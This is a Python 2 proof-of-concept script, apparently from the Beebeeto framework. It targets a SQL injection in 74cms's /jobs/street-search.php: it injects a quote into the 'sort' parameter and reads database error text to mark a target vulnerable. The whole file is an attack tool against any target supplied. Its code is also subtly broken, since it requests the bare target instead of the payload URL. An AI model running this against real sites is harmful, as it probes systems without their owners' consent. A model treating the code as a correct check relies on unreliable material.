#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0082',
            'name': '74cms /street-search.php SQL注入漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-04-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '74cms',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['74cms/骑士cms漏洞', '/street-search.php', 'SQL Injection', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-081822'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = "/jobs/street-search.php?sort=wage%3Edesc%27&page=1&streetid=&inforow="
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(url)
        if req.status_code == 200:
            if 'Error' in req.content and 'ORDER BY' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())